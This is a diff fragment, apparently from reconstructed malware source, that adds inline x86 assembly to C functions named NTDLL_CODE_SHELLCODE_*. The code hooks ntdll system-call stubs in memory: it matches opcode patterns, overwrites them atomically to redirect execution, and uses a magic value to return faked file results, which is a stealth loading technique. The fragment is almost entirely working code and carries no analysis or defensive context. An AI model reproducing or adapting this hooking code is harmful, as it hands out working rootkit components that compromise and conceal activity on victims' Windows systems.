+
+		jmp     short __REF_10
+
+	__REF_9:
+		pop     edx
+		lea     edx, [esp+8]
+		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h
+
+	__REF_10:
+		retn
+
+	__REF_11:
+		call    __ASM_REF_4
+		test    edx, edx
+		jz      short __REF_12
+		push    eax
+		push    edi
+		mov     edi, [esp+18h]
+		call    __ASM_REF_6
+		mov     edx, eax
+		pop     edi
+		pop     eax
+		test    edx, edx
+		jz      short __REF_12
+		mov     eax, [esp+8]
+		mov     dword ptr [eax], 0AE1982AEh
+		xor     eax, eax
+		retn
+
+	__REF_12:
+		push    edx
+		call    __ASM_REF_5
+		cmp     dword ptr [edx+4], 0
+		jnz     short __REF_13
+		pop     edx
+		lea     edx, [esp+8]
+		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
+								; DS:SI -> counted CR-terminated command string
+		jmp     short __REF_14
+
+	__REF_13:
+		pop     edx
+		lea     edx, [esp+8]
+		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h
+
+	__REF_14:
+		retn
+
+	__REF_15:
+		cmp     [esp+8], 0AE1982AEh
+		jnz     short __REF_16
+		xor     eax, eax
+		retn
+
+	__REF_16:
+		call    __ASM_REF_4
+		test    edx, edx
+		jz      short __REF_18
+		push    eax
+		mov     eax, [esp+8]
+		cmp     [edx+8], eax
+		jnz     short __REF_17
+		mov     dword ptr [edx+8], 0
+
+	__REF_17:
+		pop     eax
+
+	__REF_18:
+		push    edx
+		call    __ASM_REF_5
+		cmp     dword ptr [edx+4], 0
+		jnz     short __REF_19
+		pop     edx
+		lea     edx, [esp+8]
+		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
+								; DS:SI -> counted CR-terminated command string
+		jmp     short __REF_20
+
+	__REF_19:
+		pop     edx
+		lea     edx, [esp+8]
+		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h
+
+	__REF_20:
+		retn
+
+	__REF_21:
+		call    __ASM_REF_4
+		test    edx, edx
+		jz      short __REF_24
+		push    eax
+		push    edx
+		push    edi
+		mov     edi, [esp+14h]
+		call    __ASM_REF_6
+		pop     edi
+		pop     edx
+		test    eax, eax
+		jz      short __REF_23
+		pop     eax
+		test    edx, edx
+		jz      short __REF_22
+		mov     edx, [esp+0Ch]
+		mov     dword ptr [edx+20h], 80h
+
+	__REF_22:
+		xor     eax, eax
+		retn
+
+	__REF_23:
+		pop     eax
+
+	__REF_24:
+		push    edx
+		call    __ASM_REF_5
+		cmp     dword ptr [edx+4], 0
+		jnz     short __REF_25
+		pop     edx
+		lea     edx, [esp+8]
+		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
+								; DS:SI -> counted CR-terminated command string
+		jmp     short __REF_26
+
+	__REF_25:
+		pop     edx
+		lea     edx, [esp+8]
+		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h
+
+	__REF_26:
+		retn
+
+	__REF_27:
+		call    __ASM_REF_4
+		test    edx, edx
+		push    edx
+		jz      short __REF_30
+		mov     edx, [edx+8]
+		cmp     edx, [esp+8]
+		jnz     short __REF_30
+		cmp     dword ptr [esp+10h], 1
+		jnz     short __REF_30
+		cmp     dword ptr [esp+18h], 30h
+		jl      short __REF_29
+		pop     edx
+		push    ecx
+		push    esi
+		push    edi
+		lea     esi, [edx+50h]
+		mov     edi, [esp+1Ch]
+		mov     ecx, 30h
+		rep movsb
+		pop     edi
+		pop     esi
+		pop     ecx
+		mov     eax, [esp+18h]
+		cmp     eax, 0
+		jz      short __REF_28
+		mov     dword ptr [eax], 30h
+
+	__REF_28:
+		xor     eax, eax
+		retn
+
+	__REF_29:
+		pop     edx
+		mov     eax, 0C000000Dh
+		retn
+
+	__REF_30:
+		pop     edx
+		push    edx
+		call    __ASM_REF_5
+		cmp     dword ptr [edx+4], 0
+		jnz     short __REF_31
+		pop     edx
+		lea     edx, [esp+8]
+		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
+								; DS:SI -> counted CR-terminated command string
+		jmp     short __REF_32
+
+	__REF_31:
+		pop     edx
+		lea     edx, [esp+8]
+		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h
+
+	__REF_32:
+		retn
+	}
+}
+
+void __declspec(naked) __ASM_REF_4(void)
+{
+	__asm
+	{
+		push    eax
+		push    esi
+		push    edi
+		push    ecx
+		push    edx
+		sub     esp, 1Ch
+		mov     eax, esp
+		push    1Ch
+		push    eax
+		push    esp
+		call    __ASM_REF_5
+		call    dword ptr [edx+0Ch]
+		mov     edi, [esp]
+		add     edi, [esp+0Ch]
+		add     esp, 1Ch
+		pop     edx
+		pop     ecx
+		mov     esi, esp
+
+	__REF_0:
+		cmp     esi, edi
+		jnb     short __REF_1
+		lodsd
+		xor     eax, 0AE1979DDh
+		lea     eax, [eax+4]
+		cmp     eax, esi
+		jnz     short __REF_0
+		lea     eax, [esi-4]
+		jmp     short __REF_2
+
+	__REF_1:
+		xor     eax, eax
+
+	__REF_2:
+		mov     edx, eax
+		pop     edi
+		pop     esi
+		pop     eax
+		retn
+	}
+}
+
+void __declspec(naked) __ASM_REF_5(void)
+{
+	__asm
+	{
+		call    $+5
+		pop     edx
+		add     edx, 124h
+		retn
+	}
+}
+
+void __declspec(naked) __ASM_REF_6(void)
+{
+	__asm
+	{
+		push    ebx
+		push    ecx
+		push    edx
+		push    edi
+		cmp     edi, 0
+		jz      short __REF_1
+		mov     edi, [edi+8]
+		cmp     edi, 0
+		jz      short __REF_1
+		movzx   ebx, word ptr [edi]
+		mov     edi, [edi+4]
+		lea     ebx, [edi+ebx+2]
+
+	__REF_0:
+		lea     ebx, [ebx-2]
+		cmp     ebx, edi
+		jle     short __REF_1
+		cmp     word ptr [ebx-2], 5Ch
+		jnz     short __REF_0
+		push    edx
+		push    ebx
+		lea     ebx, [edx+10h]
+		push    ebx
+		call    __ASM_REF_5
+		call    dword ptr [edx+8]
+		pop     edx
+		test    eax, eax
+		jnz     short __REF_1
+		inc     eax
+		jmp     short __REF_2
+
+	__REF_1: 
+		xor     eax, eax
+
+	__REF_2:
+		pop     edi
+		pop     edx
+		pop     ecx
+		pop     ebx
+		retn
+	}
+}
+
+void __declspec(naked) __ASM_REF_7(void)
+{
+	__asm
+	{
+		push    eax
+		push    ecx
+		push    edx
+		call    __ASM_REF_5
+		mov     dword ptr [edx+4], 0
+		push    dword ptr [edx]
+		call    dword ptr [edx+14h]
+		pop     ecx
+		test    eax, eax
+		jz      __REF_3
+		push    eax
+		push    ecx
+		push    eax
+		push    esp
+		push    80h
+		push    18h
+		push    eax
+		call    __ASM_REF_5
+		call    dword ptr [edx+10h]
+		pop     edx
+		mov     edx, eax
+		pop     ecx
+		pop     eax
+		test    edx, edx
+		jz      __REF_3
+		cmp     byte ptr [eax], 0B8h
+		jnz     __REF_3
+		cmp     byte ptr [eax+5], 0BAh
+		jz      short __REF_1
+		cmp     dword ptr [eax+5], 424548Dh
+		jnz     short __REF_0
+		cmp     dword ptr [eax+8], 0C22ECD04h
+		jnz     short __REF_3
+		sub     ecx, eax
+		sub     ecx, 0Ah
+		mov     [eax+6], ecx
+		mov     byte ptr [eax+5], 0E8h
+		mov     byte ptr [eax+0Ah], 90h
+		jmp     short __REF_3
+
+	__REF_0:
+		cmp     dword ptr [eax+7], 424548Dh
+		jnz     short __REF_3
+		cmp     dword ptr [eax+0Bh], 0C015FF64h
+		jnz     short __REF_3
+		cmp     dword ptr [eax+0Fh], 0C2000000h
+		jnz     short __REF_3
+		push    edx
+		call    __ASM_REF_5
+		mov     dword ptr [edx+4], 1
+		pop     edx
+		push    esi
+		push    eax
+		push    ebx
+		push    ecx
+		push    edx
+		mov     esi, eax
+		mov     eax, [esi+0Ah]
+		mov     edx, [esi+0Eh]
+		sub     ecx, esi
+		sub     ecx, 12h
+		mov     ebx, 0E8909004h
+		lock cmpxchg8b qword ptr [esi+0Ah]
+		pop     edx
+		pop     ecx
+		pop     ebx
+		pop     eax
+		pop     esi
+		jmp     short __REF_3
+
+	__REF_1:
+		cmp     word ptr [eax+0Ah], 0D2FFh
+		jz      short __REF_2
+		cmp     word ptr [eax+0Ah], 12FFh
+		jnz     short __REF_3
+		mov     byte ptr [eax+0Bh], 0D2h
+
+	__REF_2:
+		mov     [eax+6], ecx
+
+	__REF_3:
+		pop     eax
+		retn
+	}
+}
 
 A_TEXT const HMODULE NTDLL_DLL = 0;
 A_TEXT const HMODULE EMPTY_PTR = 0;
@@ -848,7 +1442,7 @@ signed int NTDLL_CODE_SHELLCODE_INIT(int a1)
 	unsigned int v8[32]; // [sp+18h] [bp-80h]@1
 
 	v6 = *(_DWORD *)(a1 + 32);
-	v7 = (char *)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - NTDLL_TABLE;
+	v7 = (char *)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - (char *)&__ASM_BLOCK1_0;
 	
 	NTDLL_CODE_SHELLCODE_FUNC4(v8, (const void *)v6, 128);
 	
@@ -899,7 +1493,7 @@ int __stdcall NTDLL_CODE_SHELLCODE_FUNC1(int a1)
 	unsigned int v4; // [sp+8h] [bp-4h]@1
 
 	v3 = *(_DWORD *)(a1 + 32);
-	v4 = (char *)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - NTDLL_TABLE;
+	v4 = (char *)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - (char *)&__ASM_BLOCK1_0;
 	v2 = (*(int (__stdcall **)(_DWORD, _DWORD))(v4 + 20))(*(_DWORD *)(v3 + 128), *(_DWORD *)(v3 + 148));
 	
 	if(v2)
